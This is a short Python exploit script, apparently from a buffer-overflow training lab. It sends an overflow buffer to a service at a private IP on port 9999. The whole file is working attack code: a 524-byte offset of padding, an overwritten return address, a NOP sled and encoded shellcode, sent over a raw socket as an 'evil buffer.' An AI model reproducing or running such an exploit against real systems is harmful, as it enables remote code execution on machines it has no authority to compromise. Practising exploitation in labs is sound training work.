#!/usr/bin/env python3

import socket

ip = "10.10.45.237"
port = 9999

prefix = ""
offset = 524 
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload = ("\xd9\xc8\xd9\x74\x24\xf4\xb8\x01\xda\x3d\xb1\x5b\x29\xc9"
"\xb1\x12\x31\x43\x17\x83\xeb\xfc\x03\x42\xc9\xdf\x44\x75"
"\x36\xe8\x44\x26\x8b\x44\xe1\xca\x82\x8a\x45\xac\x59\xcc"
"\x35\x69\xd2\xf2\xf4\x09\x5b\x74\xfe\x61\x56\x8d\x07\xd2"
"\x0e\x93\x07\x05\x94\x1a\xe6\x95\x4c\x4d\xb8\x86\x23\x6e"
"\xb3\xc9\x89\xf1\x91\x61\x7c\xdd\x66\x19\xe8\x0e\xa6\xbb"
"\x81\xd9\x5b\x69\x01\x53\x7a\x3d\xae\xae\xfd")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    s.recv(1024)
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except Exception as ex:
    print(f"Could not connect.\n\nError: {ex}")
